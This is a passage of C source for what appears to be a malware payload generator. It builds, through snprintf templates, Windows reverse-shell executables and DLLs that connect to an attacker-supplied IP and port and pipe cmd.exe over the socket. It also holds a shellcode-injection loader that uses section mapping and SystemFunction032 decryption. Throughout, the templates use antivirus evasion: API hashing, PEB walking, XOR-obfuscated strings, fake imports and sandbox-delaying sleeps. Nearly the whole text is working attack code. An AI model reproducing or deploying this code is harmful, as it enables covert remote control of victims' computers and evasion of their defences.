        "VOID IatCamouflage() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)Helper(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define KERNEL32_djb2                   0xA5E086A2\n"
        "#define NTDLL_djb2                      0x5251037A\n"
        "#define LoadLibraryA_djb2               0xA4E3F108\n"
        "#define WSAStartup_djb2                 0x5925BC50\n"
        "#define WSASocketA_djb2                 0xE2F31987\n"
        "#define inet_pton_djb2                  0xB9D29D42\n"
        "#define htons_djb2                      0xBC98541E\n"
        "#define connect_djb2                    0x068FB8DC\n"
        "#define closesocket_djb2                0x65188A91\n"
        "#define WSACleanup_djb2                 0xE6AD20A5\n"
        "#define CreateProcessA_djb2             0x4CA64FE6\n"
        "#define NtWaitForSingleObject_djb2      0xCB42C5A9\n"
        "#define NtClose_djb2                    0xF20D7F2A\n"
        "#define NtDelayExecution_djb2           0x1236E2D7\n\n"
        "typedef int (WINAPI* WSAStartup_t)(WORD, LPWSADATA);\n"
        "typedef SOCKET(WINAPI* WSASocketA_t)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);\n"
        "typedef u_short(WINAPI* htons_t)(u_short);\n"
        "typedef int (WINAPI* connect_t)(SOCKET, const struct sockaddr*, int);\n"
        "typedef int (WINAPI* closesocket_t)(SOCKET);\n"
        "typedef int (WINAPI* WSACleanup_t)(void);\n"
        "typedef BOOL(WINAPI* CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n"
        "typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR);\n"
        "typedef int (WSAAPI* inet_pton_t)(INT, PCSTR, PVOID);\n\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject_t)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* funNtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* funNtClose_t)(HANDLE);\n\n"
        "#define INITIAL_HASH 4338         \n"
        "#define INITIAL_SEED 7 \n\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER			pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS			pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER		ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY		pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD						FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD						FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD						FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID	pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB					pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB					pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n\n"

        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char ip[] = {%s};\n"
        "char cmd[] = {%s};\n"
        "char ws2[] = {%s};\n"

        "WSAStartup_t pWSAStartup;\n"
        "WSASocketA_t pWSASocketA;\n"
        "inet_pton_t pinet_pton;\n"
        "htons_t phtons;\n"
        "connect_t pconnect;\n"
        "closesocket_t pclosesocket;\n"
        "WSACleanup_t pWSACleanup;\n"
        "CreateProcessA_t pCreateProcessA;\n"
        "funNtWaitForSingleObject_t pNtWaitForSingleObject;\n"
        "funNtDelayExecution_t pNtDelayExecution;\n"
        "funNtClose_t pNtClose;\n\n"
        "VOID my_zero_memory(void* ptr, size_t size) {\n"
        "    char* p = (char*)ptr;\n"
        "    for (size_t i = 0; i < size; i++) {\n"
        "        p[i] = 0;\n"
        "    }\n"
        "}\n"
        "VOID delayEx(IN FLOAT fMinutes) {\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    pNtDelayExecution(FALSE, &DelayInterval);\n"
        "}\n"
        "VOID connect_and_execute() {\n"
        "    obf((char*)cmd, sizeof(cmd), xkey, sizeof(xkey));\n"
        "    obf((char*)ip, sizeof(ip), xkey, sizeof(xkey));\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    WSADATA wsadata;\n"
        "    pWSAStartup(MAKEWORD(2, 2), &wsadata);\n"
        "    SOCKET socket = pWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n"
        "    if (socket == INVALID_SOCKET) {\n"
        "        pWSACleanup();\n"
        "    }\n"
        "    struct sockaddr_in remot_addr;\n"
        "    remot_addr.sin_family = AF_INET;\n"
        "    remot_addr.sin_port = phtons(%d);\n"

        "    pinet_pton(AF_INET, ip, &remot_addr.sin_addr);\n"
        "    if (pconnect(socket, (SOCKADDR*)&remot_addr, sizeof(remot_addr)) == SOCKET_ERROR) {\n"
        "        pclosesocket(socket);\n"
        "        pWSACleanup();\n"
        "    }\n"
        "    STARTUPINFO si;\n"
        "    PROCESS_INFORMATION pi;\n"
        "    my_zero_memory(&si, sizeof(si));\n"
        "    si.cb = sizeof(si);\n"
        "    si.dwFlags = STARTF_USESTDHANDLES;\n"
        "    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)socket;\n"

        "    if (pCreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {\n"
        "        pNtWaitForSingleObject(pi.hProcess, FALSE, &timeout);\n"
        "    }\n"
        "    pNtClose(pi.hProcess);\n"
        "    pNtClose(pi.hThread);\n"
        "    pclosesocket(socket);\n"
        "    pWSACleanup();\n"
        "}\n"
        "BOOL Inisialize_struct() {\n"
        "    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_djb2);\n"
        "    HMODULE ntdll_32 = GetModuleHandleH(NTDLL_djb2);\n"
        "    LoadLibraryA_t pLoadLibraryA = (LoadLibraryA_t)GetProcAddressH(hKernel32, LoadLibraryA_djb2);\n"
        "    obf((char*)ws2, sizeof(ws2), xkey, sizeof(xkey));\n"
        "    HMODULE hWs2_32 = pLoadLibraryA(ws2);\n"
        "    pWSAStartup = (WSAStartup_t)GetProcAddressH(hWs2_32, WSAStartup_djb2);\n"
        "    pWSASocketA = (WSASocketA_t)GetProcAddressH(hWs2_32, WSASocketA_djb2);\n"
        "    pinet_pton = (inet_pton_t)GetProcAddressH(hWs2_32, inet_pton_djb2);\n"
        "    phtons = (htons_t)GetProcAddressH(hWs2_32, htons_djb2);\n"
        "    pconnect = (connect_t)GetProcAddressH(hWs2_32, connect_djb2);\n"
        "    pclosesocket = (closesocket_t)GetProcAddressH(hWs2_32, closesocket_djb2);\n"
        "    pWSACleanup = (WSACleanup_t)GetProcAddressH(hWs2_32, WSACleanup_djb2);\n"
        "    pCreateProcessA = (CreateProcessA_t)GetProcAddressH(hKernel32, CreateProcessA_djb2);\n"
        "    pNtWaitForSingleObject = (funNtWaitForSingleObject_t)GetProcAddressH(ntdll_32, NtWaitForSingleObject_djb2);\n"
        "    pNtDelayExecution = (funNtDelayExecution_t)GetProcAddressH(ntdll_32, NtDelayExecution_djb2);\n"
        "    pNtClose = (funNtClose_t)GetProcAddressH(ntdll_32, NtClose_djb2);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
        "    Inisialize_struct();\n"
        "    delayEx(0.5);\n"
        "    connect_and_execute();\n"
        "    return 0;\n"
        "}\n",
        xkey, obf_ip, obf_cmd, obf_ws2dll, port
    );
}
void deley_source_2_tcp__time_dll(char* payload, size_t size, const char* ip, const char* port_str) {
    int port = atoi(port_str);
    char* xkey = generate_random_string_key();
    char* obf_ip = obf(ip, xkey);
    char* obf_cmd = obf("cmd.exe", xkey);
    char* obf_ws2dll = obf("ws2_32.dll", xkey);

    snprintf(payload, size,
        "#include <winsock2.h>\n"
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "#define KERNEL32_djb2                   0xA5E086A2\n"
        "#define NTDLL_djb2                      0x5251037A\n"
        "#define LoadLibraryA_djb2               0xA4E3F108\n"
        "#define WSAStartup_djb2                 0x5925BC50\n"
        "#define WSASocketA_djb2                 0xE2F31987\n"
        "#define inet_pton_djb2                  0xB9D29D42\n"
        "#define htons_djb2                      0xBC98541E\n"
        "#define connect_djb2                    0x068FB8DC\n"
        "#define closesocket_djb2                0x65188A91\n"
        "#define WSACleanup_djb2                 0xE6AD20A5\n"
        "#define CreateProcessA_djb2             0x4CA64FE6\n"
        "#define NtWaitForSingleObject_djb2      0xCB42C5A9\n"
        "#define NtClose_djb2                    0xF20D7F2A\n"
        "#define NtDelayExecution_djb2           0x1236E2D7\n\n"
        "typedef int (WINAPI* WSAStartup_t)(WORD, LPWSADATA);\n"
        "typedef SOCKET(WINAPI* WSASocketA_t)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);\n"
        "typedef u_short(WINAPI* htons_t)(u_short);\n"
        "typedef int (WINAPI* connect_t)(SOCKET, const struct sockaddr*, int);\n"
        "typedef int (WINAPI* closesocket_t)(SOCKET);\n"
        "typedef int (WINAPI* WSACleanup_t)(void);\n"
        "typedef BOOL(WINAPI* CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n"
        "typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR);\n"
        "typedef int (WSAAPI* inet_pton_t)(INT, PCSTR, PVOID);\n\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject_t)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* funNtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* funNtClose_t)(HANDLE);\n\n"
        "#define INITIAL_HASH 4338         \n"
        "#define INITIAL_SEED 7 \n\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n\n"


        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char ip[] = {%s};\n"
        "char cmd[] = {%s};\n"
        "char ws2[] = {%s};\n"


        "WSAStartup_t pWSAStartup;\n"
        "WSASocketA_t pWSASocketA;\n"
        "inet_pton_t pinet_pton;\n"
        "htons_t phtons;\n"
        "connect_t pconnect;\n"
        "closesocket_t pclosesocket;\n"
        "WSACleanup_t pWSACleanup;\n"
        "CreateProcessA_t pCreateProcessA;\n"
        "funNtWaitForSingleObject_t pNtWaitForSingleObject;\n"
        "funNtDelayExecution_t pNtDelayExecution;\n"
        "funNtClose_t pNtClose;\n\n"
        "VOID my_zero_memory(void* ptr, size_t size) {\n"
        "    char* p = (char*)ptr;\n"
        "    for (size_t i = 0; i < size; i++) {\n"
        "        p[i] = 0;\n"
        "    }\n"
        "}\n"
        "VOID delayEx(IN FLOAT fMinutes) {\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    pNtDelayExecution(FALSE, &DelayInterval);\n"
        "}\n"
        "VOID connect_and_execute() {\n"
        "    obf((char*)cmd, sizeof(cmd), xkey, sizeof(xkey));\n"
        "    obf((char*)ip, sizeof(ip), xkey, sizeof(xkey));\n"

        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    WSADATA wsadata;\n"
        "    pWSAStartup(MAKEWORD(2, 2), &wsadata);\n"
        "    SOCKET socket = pWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n"
        "    if (socket == INVALID_SOCKET) {\n"
        "        pWSACleanup();\n"
        "    }\n"
        "    struct sockaddr_in remot_addr;\n"
        "    remot_addr.sin_family = AF_INET;\n"
        "    remot_addr.sin_port = phtons(%d);\n"

        "    pinet_pton(AF_INET, ip , &remot_addr.sin_addr);\n"


        "    if (pconnect(socket, (SOCKADDR*)&remot_addr, sizeof(remot_addr)) == SOCKET_ERROR) {\n"
        "        pclosesocket(socket);\n"
        "        pWSACleanup();\n"
        "    }\n"
        "    STARTUPINFO si;\n"
        "    PROCESS_INFORMATION pi;\n"
        "    my_zero_memory(&si, sizeof(si));\n"
        "    si.cb = sizeof(si);\n"
        "    si.dwFlags = STARTF_USESTDHANDLES;\n"
        "    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)socket;\n"

        "    if (pCreateProcessA(NULL, cmd , NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {\n"
        "        pNtWaitForSingleObject(pi.hProcess, FALSE, &timeout);\n"
        "    }\n"
        "    pNtClose(pi.hProcess);\n"
        "    pNtClose(pi.hThread);\n"
        "    pclosesocket(socket);\n"
        "    pWSACleanup();\n"
        "}\n"
        "BOOL Inisialize_struct() {\n"
        "    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_djb2);\n"
        "    HMODULE ntdll_32 = GetModuleHandleH(NTDLL_djb2);\n"
        "    LoadLibraryA_t pLoadLibraryA = (LoadLibraryA_t)GetProcAddressH(hKernel32, LoadLibraryA_djb2);\n"

        "    obf((char*)ws2, sizeof(ws2), xkey, sizeof(xkey));\n"
        "    HMODULE hWs2_32 = pLoadLibraryA(ws2);\n"
        "    pWSAStartup = (WSAStartup_t)GetProcAddressH(hWs2_32, WSAStartup_djb2);\n"
        "    pWSASocketA = (WSASocketA_t)GetProcAddressH(hWs2_32, WSASocketA_djb2);\n"
        "    pinet_pton = (inet_pton_t)GetProcAddressH(hWs2_32, inet_pton_djb2);\n"
        "    phtons = (htons_t)GetProcAddressH(hWs2_32, htons_djb2);\n"
        "    pconnect = (connect_t)GetProcAddressH(hWs2_32, connect_djb2);\n"
        "    pclosesocket = (closesocket_t)GetProcAddressH(hWs2_32, closesocket_djb2);\n"
        "    pWSACleanup = (WSACleanup_t)GetProcAddressH(hWs2_32, WSACleanup_djb2);\n"
        "    pCreateProcessA = (CreateProcessA_t)GetProcAddressH(hKernel32, CreateProcessA_djb2);\n"
        "    pNtWaitForSingleObject = (funNtWaitForSingleObject_t)GetProcAddressH(ntdll_32, NtWaitForSingleObject_djb2);\n"
        "    pNtDelayExecution = (funNtDelayExecution_t)GetProcAddressH(ntdll_32, NtDelayExecution_djb2);\n"
        "    pNtClose = (funNtClose_t)GetProcAddressH(ntdll_32, NtClose_djb2);\n"
        "}\n"
        "VOID shell() {\n"
        "    Inisialize_struct();\n"
        "    delayEx(0.5);\n"
        "    connect_and_execute();\n"
        "}\n"
        "extern __declspec(dllexport) int hacked() {\n"
        "    shell();\n"
        "}\n"
        "BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {\n"
        "    switch (ul_reason_for_call)  {\n"
        "    case DLL_PROCESS_ATTACH:\n"
        "    case DLL_PROCESS_DETACH:\n"
        "    case DLL_THREAD_ATTACH:\n"
        "    case DLL_THREAD_DETACH:\n"
        "        break;\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n",
        xkey, obf_ip, obf_cmd, obf_ws2dll, port
    );
}



//================================================================================================================================================================//
// _source _code without deley 
//================================================================================================================================================================//


VOID _source_4_mapping_injection(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));


    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);

    snprintf(payload, size,
        "#include <Windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* funLoadLibraryA)(LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* fnNtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);\n"
        "typedef NTSTATUS(NTAPI* fnNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* fnUnmapViewOfSection)(HANDLE, PVOID);\n"
        "typedef NTSTATUS(NTAPI* fnNtCreateThreadEx) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject) (HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* fnNtClose)(HANDLE);\n"
        "typedef FARPROC(NTAPI* funGetProcAddress)(HMODULE, LPCSTR);\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int RandomCompileTimeSeed(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "} \n"
        "PVOID Helper(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = RandomCompileTimeSeed() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n"
        "VOID IatCamouflage() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)Helper(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define NTDLL_djb2                  0x5251037A\n"
        "#define KERNEL32_djb2               0xA5E086A2\n"
        "#define NtCreateSection_djb2        0x468A2FDD\n"
        "#define NtMapViewOfSection_djb2     0xC0261277\n"
        "#define NtUnmapViewOfSection_djb2   0x129AF9DA\n"
        "#define NtWaitForSingleObject_djb2  0xCB42C5A9\n"
        "#define NtCreateThreadEx_djb2       0x61D8C71D\n"
        "#define NtDelayExecution_djb2       0x1236E2D7\n"
        "#define NtClose_djb2                0xF20D7F2A\n"
        "#define LoadLibraryA_djb2           0xA4E3F108\n"
        "#define GetProcAddress_djb2         0xB9D893EC\n"
        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pFunction032[] = {%s};\n"
        "unsigned char EncryptedPayload[] = { %s };\n"
        "unsigned char ProtectedKey[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338         \n"
        "#define INITIAL_SEED 7 \n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
